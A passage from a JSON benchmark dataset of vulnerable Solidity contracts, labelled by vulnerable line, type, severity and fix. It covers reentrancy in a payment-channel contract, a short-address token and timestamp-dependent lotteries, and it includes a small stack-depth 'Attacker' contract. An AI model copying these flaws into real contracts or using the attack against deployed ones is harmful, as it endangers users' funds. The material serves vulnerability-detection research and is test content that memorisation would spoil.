bytes32 indexed channelId,\n         uint256 sequence,\n         uint256 numOpenVc,\n         uint256 ethBalanceA,\n         uint256 tokenBalanceA,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI,\n         bytes32 vcRoot,\n         uint256 updateLCtimeout\n     );\n\n     event DidLCClose (\n         bytes32 indexed channelId,\n         uint256 sequence,\n         uint256 ethBalanceA,\n         uint256 tokenBalanceA,\n         uint256 ethBalanceI,\n         uint256 tokenBalanceI\n     );\n\n     event DidVCInit (\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         bytes proof,\n         uint256 sequence,\n         address partyA,\n         address partyB,\n         uint256 balanceA,\n         uint256 balanceB\n     );\n\n     event DidVCSettle (\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         uint256 updateSeq,\n         uint256 updateBalA,\n         uint256 updateBalB,\n         address challenger,\n         uint256 updateVCtimeout\n     );\n\n     event DidVCClose(\n         bytes32 indexed lcId,\n         bytes32 indexed vcId,\n         uint256 balanceA,\n         uint256 balanceB\n     );\n\n     struct Channel {\n         //TODO: figure out if it's better just to split arrays by balances/deposits instead of eth/erc20\n         address[2] partyAddresses; // 0: partyA 1: partyI\n         uint256[4] ethBalances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[4] erc20Balances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[2] initialDeposit; // 0: eth 1: tokens\n         uint256 sequence;\n         uint256 confirmTime;\n         bytes32 VCrootHash;\n         uint256 LCopenTimeout;\n         uint256 updateLCtimeout; // when update LC times out\n         bool isOpen; // true when both parties have joined\n         bool isUpdateLCSettling;\n         uint256 numOpenVC;\n         HumanStandardToken token;\n     }\n\n     // virtual-channel state\n     struct VirtualChannel {\n         bool isClose;\n         bool isInSettlementState;\n         uint256 sequence;\n         address challenger; // Initiator of challenge\n         uint256 updateVCtimeout; // when update VC times out\n         // channel state\n         address partyA; // VC participant A\n         address partyB; // VC participant B\n         address partyI; // LC hub\n         uint256[2] ethBalances;\n         uint256[2] erc20Balances;\n         uint256[2] bond;\n         HumanStandardToken token;\n     }\n\n     mapping(bytes32 => VirtualChannel) public virtualChannels;\n     mapping(bytes32 => Channel) public Channels;\n\n     function createChannel(\n         bytes32 _lcID,\n         address _partyI,\n         uint256 _confirmTime,\n         address _token,\n         uint256[2] _balances // [eth, token]\n     )\n         public\n         payable\n     {\n         require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n         require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n         require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n         // Set initial ledger channel state\n         // Alice must execute this and we assume the initial state\n         // to be signed from this requirement\n         // Alternative is to check a sig as in joinChannel\n         Channels[_lcID].partyAddresses[0] = msg.sender;\n         Channels[_lcID].partyAddresses[1] = _partyI;\n\n         if(_balances[0] != 0) {\n             require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n             Channels[_lcID].ethBalances[0] = msg.value;\n         }\n         if(_balances[1] != 0) {\n             Channels[_lcID].token = HumanStandardToken(_token);\n             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n             Channels[_lcID].erc20Balances[0] = _balances[1];\n         }\n\n         Channels[_lcID].sequence = 0;\n         Channels[_lcID].confirmTime = _confirmTime;\n         // is close flag, lc state sequence, number open vc, vc root hash, partyA...\n         //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n         Channels[_lcID].LCopenTimeout = now + _confirmTime;\n         Channels[_lcID].initialDeposit = _balances;\n\n         emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n     }\n\n     function LCOpenTimeout(bytes32 _lcID) public {\n         require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n         require(now > Channels[_lcID].LCopenTimeout);\n\n         if(Channels[_lcID].initialDeposit[0] != 0) {\n             // <yes> <report> REENTRANCY\n             Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n         }\n         if(Channels[_lcID].initialDeposit[1] != 0) {\n             // <yes> <report> REENTRANCY\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n         }\n\n         emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n\n         // only safe to delete since no action was taken on this channel\n         delete Channels[_lcID];\n     }\n\n     function joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\n         // require the channel is not open yet\n         require(Channels[_lcID].isOpen == false);\n         require(msg.sender == Channels[_lcID].partyAddresses[1]);\n\n         if(_balances[0] != 0) {\n             require(msg.value == _balances[0], \"state balance does not match sent value\");\n             Channels[_lcID].ethBalances[1] = msg.value;\n         }\n         if(_balances[1] != 0) {\n             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\n             Channels[_lcID].erc20Balances[1] = _balances[1];\n         }\n\n         Channels[_lcID].initialDeposit[0]+=_balances[0];\n         Channels[_lcID].initialDeposit[1]+=_balances[1];\n         // no longer allow joining functions to be called\n         Channels[_lcID].isOpen = true;\n         numChannels++;\n\n         emit DidLCJoin(_lcID, _balances[0], _balances[1]);\n     }\n\n\n     // additive updates of monetary state\n     // TODO check this for attack vectors\n     function deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\n         require(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\n         require(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\n\n         //if(Channels[_lcID].token)\n\n         if (Channels[_lcID].partyAddresses[0] == recipient) {\n             if(isToken) {\n                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                 Channels[_lcID].erc20Balances[2] += _balance;\n             } else {\n                 require(msg.value == _balance, \"state balance does not match sent value\");\n                 Channels[_lcID].ethBalances[2] += msg.value;\n             }\n         }\n\n         if (Channels[_lcID].partyAddresses[1] == recipient) {\n             if(isToken) {\n                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                 Channels[_lcID].erc20Balances[3] += _balance;\n             } else {\n                 require(msg.value == _balance, \"state balance does not match sent value\");\n                 Channels[_lcID].ethBalances[3] += msg.value;\n             }\n         }\n\n         emit DidLCDeposit(_lcID, recipient, _balance, isToken);\n     }\n\n     // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update\n     function consensusCloseChannel(\n         bytes32 _lcID,\n         uint256 _sequence,\n         uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string _sigA,\n         string _sigI\n     )\n         public\n     {\n         // assume num open vc is 0 and root hash is 0x0\n         //require(Channels[_lcID].sequence < _sequence);\n         require(Channels[_lcID].isOpen == true);\n         uint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\n         uint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\n         require(totalEthDeposit == _balances[0] + _balances[1]);\n         require(totalTokenDeposit == _balances[2] + _balances[3]);\n\n         bytes32 _state = keccak256(\n             abi.encodePacked(\n                 _lcID,\n                 true,\n                 _sequence,\n                 uint256(0),\n                 bytes32(0x0),\n                 Channels[_lcID].partyAddresses[0],\n                 Channels[_lcID].partyAddresses[1],\n                 _balances[0],\n                 _balances[1],\n                 _balances[2],\n                 _balances[3]\n             )\n         );\n\n         require(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n         require(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n         Channels[_lcID].isOpen = false;\n\n         if(_balances[0] != 0 || _balances[1] != 0) {\n             Channels[_lcID].partyAddresses[0].transfer(_balances[0]);\n             Channels[_lcID].partyAddresses[1].transfer(_balances[1]);\n         }\n\n         if(_balances[2] != 0 || _balances[3] != 0) {\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\n             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");\n         }\n\n         numChannels--;\n\n         emit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n     }\n\n     // Byzantine functions\n\n     function updateLCstate(\n         bytes32 _lcID,\n         uint256[6] updateParams, // [sequence, numOpenVc, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI]\n         bytes32 _VCroot,\n         string _sigA,\n         string _sigI\n     )\n         public\n     {\n         Channel storage channel = Channels[_lcID];\n         require(channel.isOpen);\n         require(channel.sequence < updateParams[0]); // do same as vc sequence check\n         require(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\n         require(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\n\n         if(channel.isUpdateLCSettling == true) {\n             require(channel.updateLCtimeout > now);\n         }\n\n         bytes32 _state = keccak256(\n             abi.encodePacked(\n                 _lcID,\n                 false,\n                 updateParams[0],\n                 updateParams[1],\n                 _VCroot,\n                 channel.partyAddresses[0],\n                 channel.partyAddresses[1],\n                 updateParams[2],\n                 updateParams[3],\n                 updateParams[4],\n                 updateParams[5]\n             )\n         );\n\n         require(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n         require(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n         // update LC state\n         channel.sequence = updateParams[0];\n         channel.numOpenVC = updateParams[1];\n         channel.ethBalances[0] = updateParams[2];\n         channel.ethBalances[1] = updateParams[3];\n         channel.erc20Balances[0] = updateParams[4];\n         channel.erc20Balances[1] = updateParams[5];\n         channel.VCrootHash = _VCroot;\n         channel.isUpdateLCSettling = true;\n         channel.updateLCtimeout = now + channel.confirmTime;\n\n         // make settlement flag\n\n         emit DidLCUpdateState (\n             _lcID,\n             updateParams[0],\n             updateParams[1],\n             updateParams[2],\n             updateParams[3],\n             updateParams[4],\n             updateParams[5],\n             _VCroot,\n             channel.updateLCtimeout\n         );\n     }\n\n     // supply initial state of VC to \"prime\" the force push game\n     function initVCstate(\n         bytes32 _lcID,\n         bytes32 _vcID,\n         bytes _proof,\n         address _partyA,\n         address _partyB,\n         uint256[2] _bond,\n         uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string sigA\n     )\n         public\n     {\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         // sub-channel must be open\n         require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         require(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\n         // prevent rentry of initializing vc state\n         require(virtualChannels[_vcID].updateVCtimeout == 0);\n         // partyB is now Ingrid\n         bytes32 _initState = keccak256(\n             abi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n         );\n\n         // Make sure Alice has signed initial vc state (A/B in oldState)\n         require(_partyA == ECTools.recoverSigner(_initState, sigA));\n\n         // Check the oldState is in the root hash\n         require(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\n\n         virtualChannels[_vcID].partyA = _partyA; // VC participant A\n         virtualChannels[_vcID].partyB = _partyB; // VC participant B\n         virtualChannels[_vcID].sequence = uint256(0);\n         virtualChannels[_vcID].ethBalances[0] = _balances[0];\n         virtualChannels[_vcID].ethBalances[1] = _balances[1];\n         virtualChannels[_vcID].erc20Balances[0] = _balances[2];\n         virtualChannels[_vcID].erc20Balances[1] = _balances[3];\n         virtualChannels[_vcID].bond = _bond;\n         virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n         virtualChannels[_vcID].isInSettlementState = true;\n\n         emit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n     }\n\n     //TODO: verify state transition since the hub did not agree to this state\n     // make sure the A/B balances are not beyond ingrids bonds\n     // Params: vc init state, vc final balance, vcID\n     function settleVC(\n         bytes32 _lcID,\n         bytes32 _vcID,\n         uint256 updateSeq,\n         address _partyA,\n         address _partyB,\n         uint256[4] updateBal, // [ethupdateBalA, ethupdateBalB, tokenupdateBalA, tokenupdateBalB]\n         string sigA\n     )\n         public\n     {\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         // sub-channel must be open\n         require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n         require(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\n         require(\n             virtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n             \"State updates may only increase recipient balance.\"\n         );\n         require(\n             virtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\n             virtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3],\n             \"Incorrect balances for bonded amount\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         // virtualChannels[_vcID].updateVCtimeout should be 0 on uninitialized vc state, and this should\n         // fail if initVC() isn't called first\n         // require(Channels[_lcID].updateLCtimeout < now && now < virtualChannels[_vcID].updateVCtimeout);\n         require(Channels[_lcID].updateLCtimeout < now); // for testing!\n\n         bytes32 _updateState = keccak256(\n             abi.encodePacked(\n                 _vcID,\n                 updateSeq,\n                 _partyA,\n                 _partyB,\n                 virtualChannels[_vcID].bond[0],\n                 virtualChannels[_vcID].bond[1],\n                 updateBal[0],\n                 updateBal[1],\n                 updateBal[2],\n                 updateBal[3]\n             )\n         );\n\n         // Make sure Alice has signed a higher sequence new state\n         require(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\n\n         // store VC data\n         // we may want to record who is initiating on-chain settles\n         virtualChannels[_vcID].challenger = msg.sender;\n         virtualChannels[_vcID].sequence = updateSeq;\n\n         // channel state\n         virtualChannels[_vcID].ethBalances[0] = updateBal[0];\n         virtualChannels[_vcID].ethBalances[1] = updateBal[1];\n         virtualChannels[_vcID].erc20Balances[0] = updateBal[2];\n         virtualChannels[_vcID].erc20Balances[1] = updateBal[3];\n\n         virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n\n         emit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n     }\n\n     function closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\n         // require(updateLCtimeout > now)\n         require(Channels[_lcID].isOpen, \"LC is closed.\");\n         require(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\n         require(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\n         require(!virtualChannels[_vcID].isClose, \"VC is already closed\");\n         // reduce the number of open virtual channels stored on LC\n         Channels[_lcID].numOpenVC--;\n         // close vc flags\n         virtualChannels[_vcID].isClose = true;\n         // re-introduce the balances back into the LC state from the settled VC\n         // decide if this lc is alice or bob in the vc\n         if(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\n             Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\n             Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\n\n             Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\n             Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n         } else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\n             Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\n             Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\n\n             Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\n             Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n         }\n\n         emit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n     }\n\n\n     // todo: allow ethier lc.end-user to nullify the settled LC state and return to off-chain\n     function byzantineCloseChannel(bytes32 _lcID) public {\n         Channel storage channel = Channels[_lcID];\n\n         // check settlement flag\n         require(channel.isOpen, \"Channel is not open\");\n         require(channel.isUpdateLCSettling == true);\n         require(channel.numOpenVC == 0);\n         require(channel.updateLCtimeout < now, \"LC timeout over.\");\n\n         // if off chain state update didnt reblance deposits, just return to deposit owner\n         uint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\n         uint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\n\n         uint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1];\n         uint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\n\n         if(possibleTotalEthBeforeDeposit < totalEthDeposit) {\n             channel.ethBalances[0]+=channel.ethBalances[2];\n             channel.ethBalances[1]+=channel.ethBalances[3];\n         } else {\n             require(possibleTotalEthBeforeDeposit == totalEthDeposit);\n         }\n\n         if(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\n             channel.erc20Balances[0]+=channel.erc20Balances[2];\n             channel.erc20Balances[1]+=channel.erc20Balances[3];\n         } else {\n             require(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n         }\n\n         // reentrancy\n         uint256 ethbalanceA = channel.ethBalances[0];\n         uint256 ethbalanceI = channel.ethBalances[1];\n         uint256 tokenbalanceA = channel.erc20Balances[0];\n         uint256 tokenbalanceI = channel.erc20Balances[1];\n\n         channel.ethBalances[0] = 0;\n         channel.ethBalances[1] = 0;\n         channel.erc20Balances[0] = 0;\n         channel.erc20Balances[1] = 0;\n\n         if(ethbalanceA != 0 || ethbalanceI != 0) {\n             channel.partyAddresses[0].transfer(ethbalanceA);\n             channel.partyAddresses[1].transfer(ethbalanceI);\n         }\n\n         if(tokenbalanceA != 0 || tokenbalanceI != 0) {\n             require(\n                 channel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n             require(\n                 channel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n         }\n\n         channel.isOpen = false;\n         numChannels--;\n\n         emit DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n     }\n\n     function _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\n         bytes32 cursor = _hash;\n         bytes32 proofElem;\n\n         for (uint256 i = 64; i <= _proof.length; i += 32) {\n             assembly { proofElem := mload(add(_proof, i)) }\n\n             if (cursor < proofElem) {\n                 cursor = keccak256(abi.encodePacked(cursor, proofElem));\n             } else {\n                 cursor = keccak256(abi.encodePacked(proofElem, cursor));\n             }\n         }\n\n         return cursor == _root;\n     }\n\n     //Struct Getters\n     function getChannel(bytes32 id) public view returns (\n         address[2],\n         uint256[4],\n         uint256[4],\n         uint256[2],\n         uint256,\n         uint256,\n         bytes32,\n         uint256,\n         uint256,\n         bool,\n         bool,\n         uint256\n     ) {\n         Channel memory channel = Channels[id];\n         return (\n             channel.partyAddresses,\n             channel.ethBalances,\n             channel.erc20Balances,\n             channel.initialDeposit,\n             channel.sequence,\n             channel.confirmTime,\n             channel.VCrootHash,\n             channel.LCopenTimeout,\n             channel.updateLCtimeout,\n             channel.isOpen,\n             channel.isUpdateLCSettling,\n             channel.numOpenVC\n         );\n     }\n\n     function getVirtualChannel(bytes32 id) public view returns(\n         bool,\n         bool,\n         uint256,\n         address,\n         uint256,\n         address,\n         address,\n         address,\n         uint256[2],\n         uint256[2],\n         uint256[2]\n     ) {\n         VirtualChannel memory virtualChannel = virtualChannels[id];\n         return(\n             virtualChannel.isClose,\n             virtualChannel.isInSettlementState,\n             virtualChannel.sequence,\n             virtualChannel.challenger,\n             virtualChannel.updateVCtimeout,\n             virtualChannel.partyA,\n             virtualChannel.partyB,\n             virtualChannel.partyI,\n             virtualChannel.ethBalances,\n             virtualChannel.erc20Balances,\n             virtualChannel.bond\n         );\n     }\n }\n",
    "vulnerable_function": "LCOpenTimeout",
    "vulnerable_lines": [
      426
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 3,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 426",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/spank_chain_payment.sol",
    "pragma": "0.4.23",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/SpankChain_source_code/SpankChain_Payment.sol"
  },
  {
    "id": "smartbugs_short_addresses_short_address_example",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "short_address_example.sol",
    "file_content": "/*\n * @source: https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/\n * @author: -\n * @vulnerable_at_lines: 18\n */\n\n pragma solidity ^0.4.11;\n\n contract MyToken {\n     mapping (address => uint) balances;\n\n     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n     function MyToken() {\n         balances[tx.origin] = 10000;\n     }\n     // <yes> <report> SHORT_ADDRESSES\n     function sendCoin(address to, uint amount) returns(bool sufficient) {\n         if (balances[msg.sender] < amount) return false;\n         balances[msg.sender] -= amount;\n         balances[to] += amount;\n         Transfer(msg.sender, to, amount);\n         return true;\n     }\n\n     function getBalance(address addr) constant returns(uint) {\n         return balances[addr];\n     }\n }\n",
    "vulnerable_function": "sendCoin",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "short_address",
    "original_category": "short_addresses",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Security vulnerability at line(s) 18",
    "fix_description": "Apply security best practices to fix this vulnerability",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/short_addresses/short_address_example.sol",
    "pragma": "0.4.11",
    "source_url": "https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/"
  },
  {
    "id": "smartbugs_time_manipulation_ether_lotto",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ether_lotto.sol",
    "file_content": "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xa11e4ed59dc94e69612f3111942626ed513cb172#code\n * @vulnerable_at_lines: 43\n * @author: -\n */\n\n pragma solidity ^0.4.15;\n\n/// @title Ethereum Lottery Game.\n\ncontract EtherLotto {\n\n    // Amount of ether needed for participating in the lottery.\n    uint constant TICKET_AMOUNT = 10;\n\n    // Fixed amount fee for each lottery game.\n    uint constant FEE_AMOUNT = 1;\n\n    // Address where fee is sent.\n    address public bank;\n\n    // Public jackpot that each participant can win (minus fee).\n    uint public pot;\n\n    // Lottery constructor sets bank account from the smart-contract owner.\n    function EtherLotto() {\n        bank = msg.sender;\n    }\n\n    // Public function for playing lottery. Each time this function\n    // is invoked, the sender has an oportunity for winning pot.\n    function play() payable {\n\n        // Participants must spend some fixed ether before playing lottery.\n        assert(msg.value == TICKET_AMOUNT);\n\n        // Increase pot for each participant.\n        pot += msg.value;\n\n        // Compute some *almost random* value for selecting winner from current transaction.\n        // <yes> <report> TIME_MANIPULATION\n        var random = uint(sha3(block.timestamp)) % 2;\n\n        // Distribution: 50% of participants will be winners.\n        if (random == 0) {\n\n            // Send fee to bank account.\n            bank.transfer(FEE_AMOUNT);\n\n            // Send jackpot to winner.\n            msg.sender.transfer(pot - FEE_AMOUNT);\n\n            // Restart jackpot.\n            pot = 0;\n        }\n    }\n\n}\n",
    "vulnerable_function": "play",
    "vulnerable_lines": [
      43
    ],
    "vulnerability_type": "timestamp_dependency",
    "original_category": "time_manipulation",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "Timestamp dependency - reliance on block.timestamp for critical logic at line(s) 43",
    "fix_description": "Use block.number for time-based logic or accept timestamp manipulation risk",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/time_manipulation/ether_lotto.sol",
    "pragma": "0.4.15",
    "source_url": "https://etherscan.io/address/0xa11e4ed59dc94e69612f3111942626ed513cb172#code"
  },
  {
    "id": "smartbugs_time_manipulation_governmental_survey",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "governmental_survey.sol",
    "file_content": "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental\n * @author: -\n * @vulnerable_at_lines: 27\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract Governmental {\n  address public owner;\n  address public lastInvestor;\n  uint public jackpot = 1 ether;\n  uint public lastInvestmentTimestamp;\n  uint public ONE_MINUTE = 1 minutes;\n\n  function Governmental() {\n    owner = msg.sender;\n    if (msg.value<1 ether) throw;\n  }\n\n  function invest() {\n    if (msg.value<jackpot/2) throw;\n    lastInvestor = msg.sender;\n    jackpot += msg.value/2;\n    // <yes> <report> TIME_MANIPULATION\n    lastInvestmentTimestamp = block.timestamp;\n  }\n\n  function resetInvestment() {\n    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)\n      throw;\n\n    lastInvestor.send(jackpot);\n    owner.send(this.balance-1 ether);\n\n    lastInvestor = 0;\n    jackpot = 1 ether;\n    lastInvestmentTimestamp = 0;\n  }\n}\n\ncontract Attacker {\n\n  function attack(address target, uint count) {\n    if (0<=count && count<1023) {\n      this.attack.gas(msg.gas-2000)(target, count+1);\n    }\n    else {\n      Governmental(target).resetInvestment();\n    }\n  }\n}\n",
    "vulnerable_function": "invest",
    "vulnerable_lines": [
      27
    ],
    "vulnerability_type": "timestamp_dependency",
    "original_category": "time_manipulation",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "Timestamp dependency - reliance on block.timestamp for critical logic at line(s) 27",
    "fix_description": "Use block.number for time-based logic or accept timestamp manipulation risk",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/time_manipulation/governmental_survey.sol",
    "pragma": "0.4.0",
    "source_url": "http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental"
  },
  {
    "id": "smartbugs_time_manipulation_lottopollo",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "lottopollo.sol",
    "file_content": "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/timestampdependent.sol\n * @author: -\n * @vulnerable_at_lines: 13,27\n */\n\npragma solidity ^0.4.0;\ncontract lottopollo {\n  address leader;\n  uint    timestamp;\n  function payOut(uint rand) internal {\n    // <yes> <report> TIME MANIPULATION\n    if ( rand> 0 && now - rand > 24 hours ) {\n      msg.sender.send( msg.value );\n\n      if ( this.balance > 0 ) {\n        leader.send( this.balance );\n      }\n    }\n    else if ( msg.value >= 1 ether ) {\n      leader = msg.sender;\n      timestamp = rand;\n    }\n  }\n  function randomGen() constant returns (uint randomNumber) {\n      // <yes> <report> TIME MANIPULATION\n      return block.timestamp;   \n    }\n  function draw(uint seed){\n    uint randomNumber=randomGen(); \n    payOut(randomNumber);\n  }\n}",
    "vulnerable_function": "payOut",
    "vulnerable_lines": [
      13
    ],
    "vulnerability_type": "timestamp_dependency",
    "original_category": "time_manipulation",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "Timestamp dependency - reliance on block.timestamp for critical logic at line(s) 13",
    "fix_description": "Use block.number for time-based logic or accept timestamp manipulation risk",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/time_manipulation/lottopollo.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/timestampdependent.sol"
  },
  {
    "id": "smartbugs_time_manipulation_roulette",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "roulette.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 18,20\n */\n\npragma solidity ^0.4.25;\n\ncontract Roulette {\n    uint public pastBlockTime; // Forces one bet per block\n\n    constructor() public payable {} // initially fund contract\n\n    // fallback function used to make a bet\n    function () public payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        // <yes> <report> TIME_MANIPULATION\n        require(now != pastBlockTime); // only 1 transaction per block\n        // <yes> <report> TIME_MANIPULATION\n        pastBlockTime = now;\n        if(now % 15 == 0) { // winner\n            msg.sender.transfer(this.balance);\n        }\n    }\n}\n",
    "vulnerable_function": "used",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "timestamp_dependency",
    "original_category": "time_manipulation",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "Timestamp dependency - reliance on block.timestamp for critical logic at line(s) 18",
    "fix_description": "Use block.number for time-based logic or accept timestamp manipulation risk",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/time_manipulation/roulette.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_time_manipulation_timed_crowdsale",
